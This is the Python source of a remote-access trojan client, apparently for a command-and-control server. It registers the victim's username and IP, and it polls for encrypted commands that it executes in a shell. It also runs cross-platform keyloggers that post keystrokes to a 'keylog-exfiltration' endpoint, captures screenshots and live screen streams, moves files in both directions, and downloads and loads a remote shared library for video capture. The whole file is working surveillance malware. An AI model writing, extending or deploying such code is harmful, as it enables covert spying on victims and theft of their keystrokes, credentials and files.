import requests
import subprocess
import time
import platform
import os
import json
import mss,mss.tools
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
import base64
import sys
from ctypes import *
import ctypes
import threading
from urllib.request import urlretrieve

os_name = platform.system()

# Global variables for keyloggers
keylog_buffer = []
buffer_lock = threading.Lock()
stop_event = threading.Event()
send_thread = None
keylogger_active = False
keylogger_thread = None  # For Linux
hook = None  # For Windows

# Global variables and constants for screen share
screenshare_thread = None
current_stop_event = None

# Track the current working directory (starting with the root or default directory)
current_directory = os.path.expanduser("~")
SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later

VIDEO_SO_URL = f"{SERVER_URL}/video.so"
ENDPOINT = f"{SERVER_URL}/api/video-frame-from-client"

CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows

# Video-related globals
video_thread = None
video_stop_event = threading.Event()
video_lib = None  # Will be loaded dynamically

# Function to get the username using `whoami` (works on both Windows and Linux)
def get_username():
    try:
        username = subprocess.check_output("whoami", shell=True).decode().strip()
        return username
    except Exception as e:
        print(f"Error retrieving username: {e}")
        return None

# Function to get the public IP address
def get_public_ip():
    try:
        # Use an external API to get the public IP address
        response = requests.get("https://api.ipify.org?format=json")
        if response.status_code == 200:
            public_ip = response.json().get("ip")
            return public_ip
        else:
            print("Failed to get public IP")
            return None
    except Exception as e:
        print(f"Error retrieving public IP: {e}")
        return None

# Function to check if the server URL is active
def is_server_url_active(url):
    try:
        response = requests.get(url, timeout=5, verify=False)
        if response.status_code == 200:
            print("Server is active and reachable.")
            return True
        else:
            print(f"Server responded with status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to server: {e}")
        return False

# Function to check if the configuration file exists based on the OS
def check_config_file():
    if platform.system() == "Linux":
        return os.path.exists(CONFIG_FILE_LINUX)
    elif platform.system() == "Windows":
        return os.path.exists(CONFIG_FILE_WINDOWS)
    else:
        return False

# Check and register the client if necessary
def check_and_register_client():
    # Check if the server is active (reachable)
    while not is_server_url_active(SERVER_URL):
        print(f"Server at {SERVER_URL} is not active. Retrying in 1 minute...")
        time.sleep(2)  # Wait for 1 minute before retrying

    print(f"Server at {SERVER_URL} is now active. Proceeding with registration...")

    # Check if the config file exists based on OS
    if check_config_file():
        config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
        with open(config_file, 'r') as file:
            data = json.load(file)
            return data.get("client_id")
    else:
        # File is missing or empty, so register with the server
        return register_client()

# Register the client and get a client_id from the server
def register_client():
    # Get client details (user, public IP, OS)
    user = get_username()  # Get the username using whoami
    public_ip = get_public_ip()
    os_name = os.uname().sysname if platform.system() != "Windows" else platform.system()

    if not user or not public_ip:
        print("Error: Could not retrieve necessary information.")
        return None

    # Send registration request to the server
    registration_data = {
        'user': user,
        'public_ip': public_ip,
        'os': os_name
    }

    try:
        # Send a POST request to the /clientRegistration endpoint
        response = requests.post(f"{SERVER_URL}/api/clientRegistration", json=registration_data, verify=False)

        if response.status_code == 201:
            # Server response contains the client_id and public_key
            client_data = response.json()
            client_id = client_data.get("client_id")
            public_key = client_data.get("public_key")  # Extract the RSA public key

            if not client_id or not public_key:
                print("Error: Server response missing client_id or public_key.")
                return None

            # Save both client_id and public_key to the config file based on OS
            config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
            with open(config_file, 'w') as file:
                json.dump({"client_id": client_id, "public_key": public_key}, file)

            print(f"Registered with client_id: {client_id} and saved server's public key.")
            return client_id  # Return client_id for immediate use
        else:
            print(f"Registration failed. Status Code: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error during registration: {e}")
        return None
    
# Start the check-and-register process
client_id = check_and_register_client()

if client_id:
    print(f"Client registered with ID: {client_id}")
else:
    print("Client registration failed.")

def aes_session_key_function(client_id, SERVER_URL, cert_path="cert.pem"):
    """
    Generate an AES session key, prepare a payload with client_id and AES key,
    encrypt the entire payload with the server's RSA public key, and send it to
    the /api/aes-share endpoint.
    
    Args:
        client_id (str): The client's unique ID from registration.
        SERVER_URL (str): The base URL of the server (default: https://localhost:5000).
        cert_path (str): Path to the server's SSL certificate for verification (default: cert.pem).
    
    Returns:
        bytes: The generated AES key if successful, None if failed.
    """
    try:
        # Step 1: Load the server's RSA public key from the config file
        config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
        print(f"Loading config file from: {config_file}")
        with open(config_file, 'r') as file:
            config_data = json.load(file)
            server_public_key_pem = config_data.get("public_key")
        
        if not server_public_key_pem:
            print("Error: Server public key not found in config file.")
            return None
        
        # Step 2: Import the RSA public key
        print("Importing server's RSA public key")
        server_public_key = RSA.import_key(server_public_key_pem)
        
        # Step 3: Generate a 256-bit AES session key
        print("Generating 256-bit AES session key")
        aes_key = get_random_bytes(32)  # 32 bytes = 256 bits
        
        # Step 4: Prepare the JSON payload
        payload = {
            "client_id": client_id,
            "aes_key": aes_key.hex()  # Store AES key as hex in payload
        }
        payload_json = json.dumps(payload)  # Serialize to JSON string
        payload_bytes = payload_json.encode('utf-8')  # Convert to bytes
        print(f"Prepared payload (JSON): {payload_json}")
        print(f"Payload size: {len(payload_bytes)} bytes")

        # Step 5: Check RSA encryption size limit
        rsa_key_size = server_public_key.size_in_bytes()  # e.g., 256 bytes for 2048-bit key
        max_data_size = rsa_key_size - 42  # OAEP padding overhead (approx 42 bytes)
        if len(payload_bytes) > max_data_size:
            print(f"Error: Payload size ({len(payload_bytes)} bytes) exceeds RSA limit ({max_data_size} bytes)")
            return None

        # Step 6: Encrypt the entire payload with the server's RSA public key
        print("Encrypting entire payload with RSA public key")
        cipher_rsa = PKCS1_OAEP.new(server_public_key)
        encrypted_payload = cipher_rsa.encrypt(payload_bytes)
        print(f"Encrypted payload (first 10 bytes): {encrypted_payload[:10].hex()}...")

        # Step 7: Send the encrypted payload to the /api/aes-share endpoint
        endpoint = f"{SERVER_URL}/api/aes-share"
        print(f"Sending POST request to {endpoint}")
        response = requests.post(
            endpoint,
            json={"encrypted_payload": encrypted_payload.hex()},  # Send as hex string
            verify=False,
            timeout=5
        )
        
        # Step 8: Check the response
        if response.status_code == 200:
            print("Encrypted payload successfully shared with server")
            return aes_key  # Return the AES key for local use
        else:
            print(f"Failed to share encrypted payload. Status code: {response.status_code}, Response: {response.text}")
            return None
            
    except Exception as e:
        print(f"Error in aes_session_key_function: {e}")
        return None

# Example usage (after registration):
aes_key = aes_session_key_function(client_id,SERVER_URL)
if aes_key:
    print(f"AES session key generated and shared: {aes_key.hex()}")

def encrypt_data(aes_key, data):
    """
    Encrypt data (text or file) using AES-GCM with the provided AES key.
    
    Args:
        aes_key (bytes): The 256-bit AES key.
        data (str or bytes): The data to encrypt (string for text, bytes for files).
    
    Returns:
        dict: Dictionary with nonce, ciphertext, and tag (all hex-encoded), or None if failed.
    """
    try:
        # Convert input to bytes
        if isinstance(data, str):
            data_bytes = data.encode('utf-8')
        elif isinstance(data, bytes):
            data_bytes = data
        else:
            raise ValueError("Data must be string or bytes")

        # Generate a 12-byte nonce for AES-GCM
        nonce = get_random_bytes(12)

        # Create AES-GCM cipher and encrypt
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data_bytes)

        # Return hex-encoded values for JSON compatibility
        return {
            "nonce": nonce.hex(),
            "ciphertext": ciphertext.hex(),
            "tag": tag.hex()
        }
    except Exception as e:
        print(f"Error in encrypt_data: {e}")
        return None




def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
    """
    Decrypt data (text or file) encrypted with AES-GCM using the provided AES key.
    
    Args:
        aes_key (bytes): The 256-bit AES key.
        nonce_hex (str): The hex-encoded nonce from encryption.
        ciphertext_hex (str): The hex-encoded ciphertext from encryption.
        tag_hex (str): The hex-encoded authentication tag from encryption.
    
    Returns:
        bytes: Decrypted data (bytes, caller can decode to string for text), or None if failed.
    """
    try:
        # Convert hex strings to bytes
        nonce = bytes.fromhex(nonce_hex)
        ciphertext = bytes.fromhex(ciphertext_hex)
        tag = bytes.fromhex(tag_hex)

        # Create AES-GCM cipher and decrypt
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)

        return plaintext_bytes
    except Exception as e:
        print(f"Error in decrypt_data: {e}")
        return None
    

# Function to capture and send screenshots
def capture_and_send(stop_event,fps):
    """
    Captures screenshots and sends them to the server in a loop until stopped.
    
    Args:
        stop_event (threading.Event): Event to signal when to stop the loop.
    """
    try:
        with mss.mss() as sct:
            if not sct.monitors:
                print("Error: No monitors detected.")
                return

            print("Starting screenshot capture at 30 FPS...")
            while not stop_event.is_set():
                start_time = time.time()

                try:
                    # Capture screenshot from the first monitor (adjust index if needed)
                    screenshot = sct.grab(sct.monitors[1])
                    screenshot_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                except Exception as e:
                    print(f"Error capturing screenshot: {e}")
                    time.sleep(FRAME_INTERVAL)
                    continue

                try:
                    # Send screenshot to the server
                    response = requests.post(
                        f"{SERVER_URL}/api/screenshare?clientId={client_id}",
                        files={"screenshot": ("screenshot.png", screenshot_bytes, "image/png")},
                        timeout=5,
                        verify=False
                    )
                    if response.status_code != 200:
                        print(f"Server responded with status: {response.status_code}")
                except requests.RequestException as e:
                    print(f"Network error: {e}")

                # Maintain 30 FPS by sleeping for the remaining time
                FRAME_INTERVAL=1/fps
                print("Frame interval is:", FRAME_INTERVAL)
                elapsed_time = time.time() - start_time
                sleep_time = max(0, FRAME_INTERVAL - elapsed_time)
                time.sleep(sleep_time)

    except Exception as e:
        print(f"Fatal error in screenshare: {e}")
    finally:
        print("Screenshare stopped")

# Function to start screensharing
def start_screenshare(fps):
    """Starts the screensharing process in a background thread."""
    global screenshare_thread, current_stop_event
    if screenshare_thread is None or not screenshare_thread.is_alive():
        stop_event = threading.Event()
        current_stop_event = stop_event
        screenshare_thread = threading.Thread(target=capture_and_send, args=(stop_event,fps))
        screenshare_thread.daemon = True  # Thread terminates when main program exits
        screenshare_thread.start()
        print("Screenshare started in background")
    else:
        print("Screenshare is already running")

# Function to stop screensharing
def stop_screenshare():
    """Stops the screensharing process and cleans up."""
    global current_stop_event, screenshare_thread
    if screenshare_thread is not None and screenshare_thread.is_alive():
        if current_stop_event:
            current_stop_event.set()  # Signal the thread to stop
        screenshare_thread.join()  # Wait for the thread to finish
        screenshare_thread = None
        current_stop_event = None
        print("Screenshare stopping initiated")
    else:
        print("No screenshare is running")



def send_keylog():
    while True:
        if stop_event.wait(timeout=10):
            break
        with buffer_lock:
            if keylog_buffer:
                data = ''.join(keylog_buffer)
                keylog_buffer.clear()
            else:
                data = None
        if data:
            try:
                # Encrypt the keylog data
                encrypted_keylog_dict = encrypt_data(aes_key, data.encode('utf-8'))
                
                # Encode the encrypted data to base64 for safe transmission
                encrypted_keylog_json = json.dumps(encrypted_keylog_dict)
                encrypted_keylog_b64 = base64.b64encode(encrypted_keylog_json.encode()).decode()
                
                # Prepare the payload as a JSON object
                payload_dict = {
                    "clientid": client_id,
                    "data": encrypted_keylog_b64
                }
                
                # Convert payload to JSON string and encode in base64
                payload_json = json.dumps(payload_dict)
                payload = base64.b64encode(payload_json.encode()).decode()

                response = requests.post(
                    SERVER_URL + '/api/keylog-exfiltration',
                    data={'payload': payload},
                    verify=False,
                    timeout=10
                )
                if response.status_code == 200:
                    print("Keylog sent successfully")
                else:
                    print(f"Failed to send keylog: {response.status_code}")
            except Exception as e:
                print(f"Error sending keylog: {e}")
    with buffer_lock:
        if keylog_buffer:
            data = ''.join(keylog_buffer)
            keylog_buffer.clear()
        else:
            data = None
    if data:
        try:
            encrypted_keylog_dict = encrypt_data(aes_key, data.encode('utf-8'))
            encrypted_keylog_json = json.dumps(encrypted_keylog_dict)
            encrypted_keylog_b64 = base64.b64encode(encrypted_keylog_json.encode()).decode()
            payload_dict = {
                "clientid": client_id,
                "data": encrypted_keylog_b64
            }
            payload_json = json.dumps(payload_dict)
            payload = base64.b64encode(payload_json.encode()).decode()

            response = requests.post(
                SERVER_URL + '/api/keylog-exfiltration',
                data={'payload': payload},
                verify=False,
                timeout=10
            )
            if response.status_code == 200:
                print("Final keylog sent successfully")
            else:
                print(f"Failed to send final keylog: {response.status_code}")
        except Exception as e:
            print(f"Error sending final keylog: {e}")

if os_name == 'Linux':
    from Xlib import X, display, XK
    from Xlib.ext import record
    from Xlib.protocol import rq

    x11 = cdll.LoadLibrary('libX11.so.6')
    x11.XKeysymToString.argtypes = [c_ulong]
    x11.XKeysymToString.restype = c_char_p

    disp = None
    ctx = None
    stop_atom = None

    def keysym_to_string(keysym):
        string = x11.XKeysymToString(keysym)
        return string.decode('latin-1') if string else None

    def run_keylogger_linux():
        global disp, ctx, stop_atom
        try:
            disp = display.Display()
        except:
            print("Error: Cannot connect to X server.")
            return

        if not disp.has_extension('RECORD'):
            print("Error: XRecord extension not available.")
            disp.close()
            return

        # Define a custom atom for stopping the keylogger
        stop_atom = disp.intern_atom("STOP_KEYLOGGER", False)

        ctx = disp.record_create_context(
            0,
            [record.AllClients],
            [{
                'core_requests': (0, 0),
                'core_replies': (0, 0),
                'ext_requests': (0, 0, 0, 0),
                'ext_replies': (0, 0, 0, 0),
                'delivered_events': (0, 0),
                'device_events': (X.KeyPress, X.KeyRelease),
                'errors': (0, 0),
                'client_started': False,
                'client_died': False,
            }]
        )

        def event_callback(reply):
            if reply.category != record.FromServer:
                return
            data = reply.data
            while data:
                event, data = rq.EventField(None).parse_binary_value(data, disp.display, None, None)
                # Check for the stop event
                if event.type == X.ClientMessage and event.client_type == stop_atom:
                    disp.record_disable_context(ctx)
                    return
                if event.type == X.KeyPress:
                    keycode = event.detail
                    state = event.state
                    shift = (state & X.ShiftMask)
                    caps = (state & X.LockMask)
                    index = 1 if (shift ^ caps) else 0
                    keysym = disp.keycode_to_keysym(keycode, index)
                    char = None
                    if 32 <= keysym <= 126:
                        char = chr(keysym)
                    else:
                        keysym_name = keysym_to_string(keysym)
                        if keysym_name:
                            char = f'[{keysym_name}]'
                        else:
                            char = f'[KeyCode:{keycode}]'
                    if char:
                        with buffer_lock:
                            keylog_buffer.append(char)

        # Blocks until record_disable_context is called from the callback
        disp.record_enable_context(ctx, event_callback)
        disp.record_free_context(ctx)
        disp.close()

    def start_keylog():
        global send_thread, keylogger_active, keylogger_thread
        if keylogger_active:
            print("Keylogger already running.")
            return

        send_thread = threading.Thread(target=send_keylog)
        send_thread.start()
        keylogger_thread = threading.Thread(target=run_keylogger_linux)
        keylogger_thread.start()
        keylogger_active = True
        print("Keylogger started.")

    def stop_keylog():
        global keylogger_active, keylogger_thread, send_thread, stop_atom
        if not keylogger_active:
            print("Keylogger not running.")
            return
        print("Stopping keylogger...")
        # Create a separate display connection to send the stop event
        disp_stop = display.Display()
        stop_atom_local = disp_stop.intern_atom("STOP_KEYLOGGER", False)
        root = disp_stop.screen().root
        event = rq.ClientMessage(window=root, client_type=stop_atom_local, data=(32, [0, 0, 0, 0, 0]))
        root.send_event(event, event_mask=X.SubstructureNotifyMask)
        disp_stop.flush()
        disp_stop.close()
        # Wait for threads to finish
        if keylogger_thread:
            keylogger_thread.join()
        stop_event.set()
        if send_thread:
            send_thread.join()
        keylogger_active = False
        stop_event.clear()
        print("Keylogger stopped.")

elif os_name == 'Windows':
    try:
        import keyboard
        import win32api
    except ImportError:
        print("Error: Required modules not installed. Run: pip install keyboard pywin32")
        sys.exit(1)

    hook = None

    def start_keylog():
        global send_thread, keylogger_active, hook
        if keylogger_active:
            print("Keylogger already running.")
            return

        SPECIAL_KEYS = {
            'enter': 'Return',
            'backspace': 'BackSpace',
            'delete': 'Delete',
            'space': 'Space',
            'esc': 'Escape',
            'tab': 'Tab',
            'caps lock': 'CapsLock',
            'shift': 'Shift',
            'ctrl': 'Ctrl',
            'alt': 'Alt',
            'right alt': 'AltGr',
            'windows': 'Super',
            'print screen': 'Print',
            'insert': 'Insert'
        }

        def on_press(event):
            try:
                name = event.name
                if name in SPECIAL_KEYS:
                    char = f'[{SPECIAL_KEYS[name]}]'
                elif len(name) > 1:
                    char = f'[{name.capitalize()}]'
                else:
                    char = name
                with buffer_lock:
                    keylog_buffer.append(char)
            except Exception as e:
                print(f"Error: {e}")

        send_thread = threading.Thread(target=send_keylog)
        send_thread.start()
        hook = keyboard.hook(on_press)  # Hooks events in the background
        keylogger_active = True
        print("Keylogger started.")

    def stop_keylog():
        global send_thread, keylogger_active, hook
        if not keylogger_active:
            print("Keylogger not running.")
            return
        print("Stopping keylogger...")
        if hook:
            keyboard.unhook_all()  # Removes all hooks
        stop_event.set()
        if send_thread:
            send_thread.join()
        keylogger_active = False
        stop_event.clear()
        print("Keylogger stopped.")


def execute_command(command):
    """Execute the shell command, update current directory if 'cd' command is issued."""
    global current_directory
    try:
        # If the command is 'cd', update the current directory
        if command.startswith("cd "):
            # Extract the directory path from the command
            new_directory = command[3:].strip()
            # If it's an absolute path, use it directly; otherwise, make it relative
            if new_directory.startswith("/"):
                current_directory = new_directory
            else:
                current_directory = os.path.join(current_directory, new_directory)
            return f"Changed directory to {current_directory}"

        # For other commands, execute them in the current directory
        result = subprocess.run(command, shell=True, cwd=current_directory, text=True, capture_output=True)

        # Return the output or error if any
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

def process_json_command(decrypted_text_ready_to_convert_to_json):
    try:
        # Detect and fix nested JSON structure if needed
        if isinstance(decrypted_text_ready_to_convert_to_json, str):
            # Try parsing directly
            try:
                parsed_data = json.loads(decrypted_text_ready_to_convert_to_json)
            except json.JSONDecodeError:
                # If parsing fails, attempt to clean and fix malformed structure
                fixed_data = decrypted_text_ready_to_convert_to_json.replace('"{', '{').replace('}"', '}')
                parsed_data = json.loads(fixed_data)

        else:
            parsed_data = decrypted_text_ready_to_convert_to_json

        # Handle both nested and simple structures
        if isinstance(parsed_data, dict):
            for key, value in parsed_data.items():
                if isinstance(value, str):
                    try:
                        # Try parsing inner JSON
                        inner_data = json.loads(value)
                        # Handle nested JSON with specific fields
                        if all(field in inner_data for field in ["upload_type", "client_id", "filename"]):
                            print(f"Upload Type: {inner_data['upload_type']}")
                            print(f"Client ID: {inner_data['client_id']}")
                            print(f"Filename: {inner_data['filename']}")
                        else:
                            # Handle other key-value structures
                            print(f"Key: {key}")
                            print(f"Value: {value}")
                    except json.JSONDecodeError:
                        # Handle simple key-value pairs
                        return value
                else:
                    return value
        else:
            print("Unexpected JSON structure")

    except Exception as e:
        print("An error occurred:", e)


def get_file_as_response_from_server_and_decrypt_and_save(filename,file_path, file_content):
    base64_decoded_file_content = base64.b64decode(file_content).decode()
    base64_decoded_in_json = json.loads(base64_decoded_file_content)
    try:
        decrypted_data = decrypt_data(aes_key,base64_decoded_in_json.get("nonce"),base64_decoded_in_json.get("ciphertext"),base64_decoded_in_json.get("tag"))
        with open(file_path, "wb") as file:
            file.write(decrypted_data)
            print(f"[+] File '{filename}' saved successfully in {current_directory}")
    except Exception as e:
        print(e)

def download_so(max_retries=3, delay=2):
    so_path = "./video.so"
    if os.path.exists(so_path) and os.path.getsize(so_path) > 0:
        print(f"Using existing {so_path}")
        return so_path

    print(f"Attempting to download {so_path} from {VIDEO_SO_URL}...")
    for attempt in range(max_retries):
        try:
            urlretrieve(VIDEO_SO_URL, so_path)
            if os.path.exists(so_path) and os.path.getsize(so_path) > 0:
                print(f"Successfully downloaded {so_path}")
                os.chmod(so_path, 0o755)
                file_info = subprocess.check_output(["file", so_path], text=True)
                print(f"File info: {file_info}")
                return so_path
            else:
                print(f"Downloaded file is empty or invalid")
                os.remove(so_path) if os.path.exists(so_path) else None
        except Exception as e:
            print(f"Download attempt {attempt + 1}/{max_retries} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(delay)
    print(f"Failed to download {so_path} after {max_retries} attempts")
    return None

def send_frame(data, length):
    if video_stop_event.is_set():
        return  # Stop sending if video is stopped
    frame_data = ctypes.string_at(data, length)
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.post(ENDPOINT, data=frame_data, headers={"Content-Type": "image/jpeg"}, timeout=5, verify=False)
            response.raise_for_status()
            print(f"Frame sent to server ({len(frame_data)} bytes)")
            return
        except requests.RequestException as e:
            print(f"Error sending frame (attempt {attempt + 1}/{max_retries}): {e}")
            if attempt < max_retries - 1:
                time.sleep(1)
    print("Failed to send frame after retries")

def start_video_capture(duration, fps):
    global video_stop_event, video_lib, video_thread
    video_stop_event.clear()  # Reset stop flag

    # Load video.so dynamically
    so_path = download_so()
    if not so_path:
        print("Error: Could not obtain video.so. Checking for local copy...")
        if os.path.exists("./video.so"):
            so_path = "./video.so"
            print("Using local video.so as fallback")
        else:
            print("No local video.so found. Cannot proceed with video capture.")
            return False

    if not os.path.exists(so_path):
        print(f"Error: {so_path} does not exist after download")
        return False
    print(f"File size: {os.path.getsize(so_path)} bytes")

    try:
        video_lib = ctypes.CDLL(so_path)
        print(f"Successfully loaded {so_path}")
    except OSError as e:
        print(f"Error loading {so_path}: {e}")
        return False

    FRAME_CALLBACK = ctypes.CFUNCTYPE(None, ctypes.POINTER(ctypes.c_ubyte), ctypes.c_size_t)
    callback = FRAME_CALLBACK(send_frame)

    video_lib.start_video_capture.restype = ctypes.c_int
    video_lib.start_video_capture.argtypes = [ctypes.c_int, ctypes.c_int, FRAME_CALLBACK]

    print(f"Starting video capture for {duration} seconds at {fps} FPS...")
    try:
        result = video_lib.start_video_capture(duration, fps, callback)
        if result == 0:
            print("Video capture completed successfully")
            return True
        else:
            print(f"Video capture failed with code {result}")
            return False
    except Exception as e:
        print(f"Error during video capture: {e}")
        return False

def stop_video():
    global video_stop_event
    video_stop_event.set()  # Signal to stop sending frames
    print("Video capture stopped")

while True:
    try:
        # Fetch command from the server every 5 seconds
        response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}", timeout=5, verify=False)  # Set timeout for the request
        
        # Check if the response status is OK
        if response.status_code == 200:
            # Decode the Base64 response text
            decoded_data = base64.b64decode(response.text).decode('utf-8')
            # Convert the decoded string back to a dictionary
            data = json.loads(decoded_data)
            # Extract the nonce, ciphertext, and tag
            nonce_hex = data["nonce"]
            ciphertext_hex = data["ciphertext"]
            tag_hex = data["tag"]

            # Call decrypt_data function with aes_key and the extracted values
            decrypted_text = decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex).decode("utf-8")
            decrypted_text_ready_to_convert_to_json = decrypted_text.replace("'", '"')

            command_after_json_processing = process_json_command(decrypted_text_ready_to_convert_to_json)
            command = f"{command_after_json_processing}"
            print("The command is: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: ", command)

            if command.startswith("start_video-"):
                try:
                    parts = command.split("-")
                    if len(parts) != 3:
                        raise ValueError("Format: start_video-<fps>-<duration>")
                    fps = int(parts[1])
                    duration = int(parts[2])
                    if fps <= 0 or duration <= 0:
                        raise ValueError("FPS and duration must be positive")
                    
                    # Stop any existing video thread
                    if video_thread and video_thread.is_alive():
                        stop_video()
                        video_thread.join()
                    
                    # Start video in a new thread
                    video_thread = threading.Thread(target=start_video_capture, args=(duration, fps))
                    video_thread.start()
                    command = ""
                except ValueError as e:
                    print(f"Invalid command format: {e}. Use start_video-<fps>-<duration> (e.g., start_video-10-20)")
                    command = ""

            elif command == "stop_video":
                if video_thread and video_thread.is_alive():
                    stop_video()
                    video_thread.join()
                    print("Video process fully stopped")
                else:
                    print("No video running to stop")
                command = ""
            if command.strip() == "screenshot":
                print("Starting screenshot process")
                try:
                    with mss.mss() as sct:
                        # Capture the primary monitor
                        screenshot = sct.grab(sct.monitors[1])  
                        # Convert the screenshot to PNG bytes
                        screenshot_raw = mss.tools.to_png(screenshot.rgb, screenshot.size)

                        # Encrypt the raw screenshot data
                        encrypted_data = encrypt_data(aes_key, screenshot_raw)

                        # Convert encrypted dictionary to JSON and then to bytes
                        encrypted_bytes = json.dumps(encrypted_data).encode('utf-8')

                        # Prepare the encrypted data for sending
                        screenshot_encrypted_file = {
                            "file": ("screenshot.enc", encrypted_bytes, "application/octet-stream")
                        }

                        print("Encrypted data prepared, sending to server...")

                        # Send the encrypted screenshot to the server
                        response = requests.post(
                            f"{SERVER_URL}/api/screenshot",
                            files=screenshot_encrypted_file,
                            data={"client_id": client_id},
                            verify=False,
                            timeout=10
                        )

                        print(f"Response Status Code: {response.status_code}")
                        print(f"Response Content: {response.text}")
                        command = ""
                except Exception as e:
                    print("Error during screenshot capture or upload:", e)
                command = ""

                
            elif command.strip() == "start_keylog":
                print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") #not necessary only for logging
                start_keylog()
                command=""
            elif command.strip() == "stop_keylog":
                stop_keylog()
                command=""
            elif command.strip == "photo":
                pass

            
            elif command.startswith("{'upload_type': 'UploadFromFiles'"):
                client_id = command_after_json_processing["client_id"]
                filename = command_after_json_processing["filename"]
                command=""
                command_after_json_processing=""
                # Send request to server
                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&filename={filename}", timeout=5, verify=False)

                # Check if the response is successful
                if response.status_code == 200:
                    file_path = os.path.join(current_directory, filename)
                    # Save the file
                    get_file_as_response_from_server_and_decrypt_and_save(filename,file_path,response.content)
                    
                else:
                    print(f"Failed to download file. Server responded with status code {response.status_code}")


            elif command.startswith("{'command': 'UploadFromServer'"):
                client_id = command_after_json_processing["client_id"]
                server_file_path_for_client = command_after_json_processing["server_file_path"]
                command=""
                command_after_json_processing=""

                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5, verify=False)
                # Check if the response is successful
                if response.status_code == 200:
                    filename = os.path.basename(server_file_path_for_client)
                    file_path = os.path.join(current_directory, filename)
                    get_file_as_response_from_server_and_decrypt_and_save(filename,file_path,response.content)
                    
                    
                else:
                    print(f"Failed to download file. Server responded with status code {response.status_code}")


                
            elif command.startswith("download"):
                _, file_path = command.split(" ", 1)
                full_file_path = os.path.join(current_directory,file_path)
                if os.path.exists(full_file_path):
                    print(full_file_path)
                try:
                    with open(full_file_path, 'rb') as file:
                        files = {'file': (os.path.basename(full_file_path), file)}
                        response = requests.post(f'{SERVER_URL}/api/download-files-from-client', files=files, verify=False)
                        print(response.text)
                except Exception as e:
                    print(f"Error sending file: {e}")
                command = ""
            elif command.strip == "persist":
                pass
            elif command.strip == "change_key":
                pass


            if command.startswith("start_screenshare_"):
                print("PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP")
                try:
                    fps = int(command.split("_")[-1])  # Extract FPS from the command
                    print(f"Starting screen share with {fps} FPS")
                    start_screenshare(fps)  # Pass FPS as an argument
                except ValueError:
                    print("Invalid FPS value in command")
            elif command == "stop_screenshare":
                stop_screenshare()
            elif command == "kill_agent":
                break

            else:
                result = {"command":command, "result": execute_command(command), "client_id":client_id}
                print(result)
                encrypted_result_dictionary = encrypt_data(aes_key,f"{result}")
                encrypted_result_dictionary = json.dumps(encrypted_result_dictionary)
                # Encode the JSON string in Base64
                encrypted_and_b64_encoded_result = base64.b64encode(encrypted_result_dictionary.encode('utf-8')).decode('utf-8')
                print(encrypted_and_b64_encoded_result)
                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client?clientID={client_id}", data=encrypted_and_b64_encoded_result, verify=False)
                
                # Check if the result was successfully sent
                if result_response.status_code != 200:
                    pass  # Do nothing on failure
        else:
            pass  # Do nothing if no command or bad status response from server

    except (requests.exceptions.RequestException, Exception):
        # Handle any error (like server down, no response, or timeout) silently
        pass
    
    # Wait for 5 seconds before the next request
    time.sleep(5)